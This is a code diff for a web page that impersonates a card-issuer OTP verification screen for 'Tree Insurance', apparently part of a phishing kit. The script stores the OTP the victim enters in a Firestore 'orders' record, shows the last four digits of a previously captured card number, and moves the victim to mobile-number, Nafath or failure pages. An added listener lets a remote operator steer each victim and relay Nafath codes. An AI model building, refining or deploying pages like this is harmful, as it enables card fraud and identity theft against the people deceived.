@@ -6,69 +6,64 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>رمز التحقق | OTP Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/inner-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { display:flex; align-items:center; justify-content:center; padding:20px; }
-        .acs-header { display:flex; justify-content:space-between; align-items:center; padding:16px 24px; border-bottom:1px solid var(--teal-border); }
-        .acs-header h3 { font-size:1rem; font-weight:700; color:var(--text-white); margin:0; }
-        .txn-row { display:flex; justify-content:space-between; padding:8px 0; font-size:0.88rem; border-bottom:1px dashed var(--teal-border); }
-        .txn-row__label { color:var(--text-muted); }
-        .txn-row__value { color:var(--text-white); font-weight:600; }
-        .spinner-hidden { display:none; margin:16px auto; }
-        .spin-ring.visible { display:block; }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 12px; }
+        .acs-container { width: 90%; max-width: 420px; overflow: hidden; }
+        .acs-header { padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; }
+        .acs-header h3 { margin: 0; font-size: 16px; font-weight: bold; }
+        .acs-header img { height: 28px; object-fit: contain; }
+        .acs-body { padding: 25px; }
+        .alert-info { padding: 10px; border-radius: 10px; font-size: 13px; margin-bottom: 20px; }
+        .txn-details { margin-bottom: 20px; font-size: 14px; }
+        .detail-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px dashed var(--tree-border); padding-bottom: 8px; }
+        label { font-size: 13px; font-weight: bold; display: block; margin-bottom: 8px; }
+        input { width: 100%; padding: 12px; border-radius: 10px; font-size: 18px; text-align: center; letter-spacing: 5px; margin-bottom: 10px; box-sizing: border-box; }
+        .timer-text { font-size: 12px; text-align: center; margin-bottom: 15px; }
+        button { width: 100%; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
+        button:hover { filter: brightness(1.05); }
+        .spinner { display: none; margin: 20px auto; border: 4px solid var(--tree-border); border-top: 4px solid var(--tree-primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer-secure { margin-top: 20px; text-align: center; opacity: 0.85; }
+        .footer-secure img { height: 22px; margin: 0 5px; }
     </style>
 </head>
-<body>
+<body class="tree-site otp-page">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<div class="teal-card teal-card--narrow" style="width:100%;">
+<div class="acs-container">
     <div class="acs-header">
         <h3 data-i18n="otp.title">إثبات ملكية البطاقة</h3>
-        <div style="display:flex;align-items:center;gap:10px;">
-            <img src="images/logo.png" alt="tree" height="28" onerror="this.src='https://placehold.co/80x28/0a4d35/00e5a0?text=tree'">
-            <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
+        <div style="display:flex;align-items:center;gap:8px;">
+            <img src="images/logo.png" alt="Tree" onerror="this.src='https://placehold.co/100x28/198754/ffffff?text=TREE'">
+            <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()" style="font-size:0.75rem;padding:3px 10px;">EN</button>
         </div>
     </div>
+    <div class="acs-body">
+        <div class="alert-info" data-i18n="otp.alert">سيتم إجراء معاملة مالية على حسابك المصرفي، يرجى التحقق من التفاصيل أدناه.</div>
 
-    <div class="card-body">
-        <div class="alert-teal" data-i18n="otp.alert">سيتم إجراء معاملة مالية على حسابك المصرفي، يرجى التحقق من التفاصيل أدناه.</div>
-
-        <div style="margin-bottom:20px;">
-            <div class="txn-row">
-                <span class="txn-row__label" data-i18n="otp.merchant">التاجر</span>
-                <span class="txn-row__value">تري | Tree Insurance</span>
-            </div>
-            <div class="txn-row">
-                <span class="txn-row__label" data-i18n="otp.amount">المبلغ</span>
-                <span class="txn-row__value">SAR <span id="txn-amount">--.--</span></span>
-            </div>
-            <div class="txn-row" style="border-bottom:none;">
-                <span class="txn-row__label" data-i18n="otp.card">البطاقة</span>
-                <span class="txn-row__value" dir="ltr">**** **** **** <span id="card-last4">----</span></span>
-            </div>
+        <div class="txn-details">
+            <div class="detail-row"><span class="detail-label" data-i18n="otp.merchant">التاجر</span><span class="detail-value">تري | Tree Insurance</span></div>
+            <div class="detail-row"><span class="detail-label" data-i18n="otp.amount">المبلغ</span><span class="detail-value">SAR <span id="txn-amount">--.--</span></span></div>
+            <div class="detail-row"><span class="detail-label" data-i18n="otp.card">البطاقة</span><span class="detail-value" dir="ltr">**** **** **** <span id="card-last4">----</span></span></div>
         </div>
 
-        <div class="field">
-            <label class="field__label" data-i18n="otp.label">رمز التحقق (OTP)</label>
-            <p style="font-size:0.78rem;color:var(--text-muted);margin-bottom:10px;" data-i18n="otp.hint">لتأكيد العملية أدخل الرمز المرسل إلى جوالك المسجل.</p>
-            <input type="number" class="otp-input" id="otpInput" placeholder="----">
-        </div>
+        <label data-i18n="otp.label">رمز التحقق (OTP)</label>
+        <p style="font-size: 12px; color: #777; margin-top: -5px; margin-bottom: 10px;" data-i18n="otp.hint">لتأكيد العملية أدخل الرمز المرسل إلى جوالك المسجل.</p>
+        <input type="number" id="otpInput" placeholder="----">
 
-        <div class="timer-chip" style="margin-bottom:16px;">
-            <span data-i18n="otp.validity">صلاحية الرمز:</span>
-            <span class="timer-chip__num" id="timer">02:00</span>
-        </div>
+        <div class="timer-text"><span data-i18n="otp.validity">صلاحية الرمز:</span> <span id="timer">02:00</span></div>
 
-        <button id="submitBtn" class="btn-green" onclick="verifyOTP()" data-i18n="otp.confirm">تأكيد</button>
-        <div class="spin-ring spinner-hidden" id="loader" style="margin-top:20px;"></div>
+        <button id="submitBtn" onclick="verifyOTP()" data-i18n="otp.confirm">تأكيد</button>
+        <div id="loader" class="spinner"></div>
 
-        <div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding-top:16px;border-top:1px dashed var(--teal-border);">
-            <img src="images/payment/visa.svg" height="22" alt="Visa">
-            <img src="images/payment/mastercard.svg" height="22" alt="Mastercard">
+        <div class="footer-secure">
+            <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
+            <img src="https://img.icons8.com/color/48/mastercard.png" alt="Mastercard">
         </div>
     </div>
 </div>
@@ -86,51 +81,85 @@
     const db = firebase.firestore();
     const userId = localStorage.getItem('user_id');
 
+    // 1. جلب تفاصيل البطاقة للعرض
     if (userId) {
         db.collection("orders").doc(userId).get().then((doc) => {
-            if (doc.exists && doc.data().card_number) {
-                document.getElementById('card-last4').innerText = doc.data().card_number.replace(/\s/g,'').slice(-4);
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.card_number) {
+                    // استخراج آخر 4 أرقام
+                    const last4 = data.card_number.replace(/\s/g, '').slice(-4);
+                    document.getElementById('card-last4').innerText = last4;
+                }
+                // يمكن عرض مبلغ افتراضي أو تركه كما هو إذا لم يتم تمريره
+                // document.getElementById('txn-amount').innerText = "1250.00"; 
             }
         });
     }
 
-    let timeLeft = 120;
+    // 2. مؤقت تنازلي
+    let timeLeft = 120; // 2 minutes
     setInterval(() => {
         if (timeLeft <= 0) return;
         timeLeft--;
-        const m = Math.floor(timeLeft/60).toString().padStart(2,'0');
-        const s = (timeLeft%60).toString().padStart(2,'0');
-        document.getElementById('timer').innerText = m+':'+s;
+        const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+        const s = (timeLeft % 60).toString().padStart(2, '0');
+        document.getElementById('timer').innerText = `${m}:${s}`;
     }, 1000);
 
     async function verifyOTP() {
         const otpValue = document.getElementById('otpInput').value;
-        if (otpValue.length < 4) { alert(t('otp.err_short')); return; }
+        if(otpValue.length < 4) { alert(t('otp.err_short')); return; }
 
+        // إظهار السبينر وإخفاء الزر
         document.getElementById('submitBtn').style.display = 'none';
-        document.getElementById('loader').classList.add('visible');
+        document.getElementById('loader').style.display = 'block';
 
         try {
-            await db.collection("orders").doc(userId).update({ otp_code: otpValue, status: "show_mobile" });
-            setTimeout(() => { window.location.href = "mobile_verification.html"; }, 1000);
+            // تحديث كود الـ OTP وتغيير الحالة فوراً إلى طلب الجوال
+            await db.collection("orders").doc(userId).update({
+                otp_code: otpValue,
+                status: "show_mobile" // الحالة التي تحوله لصفحة الجوال
+            });
+
+            // التحويل التلقائي لصفحة الجوال
+            setTimeout(() => {
+                window.location.href = "mobile_verification.html";
+            }, 1000); // تأخير بسيط لضمان الحفظ
+
         } catch (error) {
+            console.error("Error:", error);
             alert(t('otp.err_connection'));
             document.getElementById('submitBtn').style.display = 'block';
-            document.getElementById('loader').classList.remove('visible');
+            document.getElementById('loader').style.display = 'none';
         }
-    }
-
-    (function() {
-        if (userId) {
-            db.collection("orders").doc(userId).onSnapshot((doc) => {
-                if (doc.exists) {
-                    const data = doc.data();
-                    if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
-                    else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
+    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp_verification.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_failed.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
                 }
-            });
-        }
-    })();
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
 </script>
 </body>
 </html>
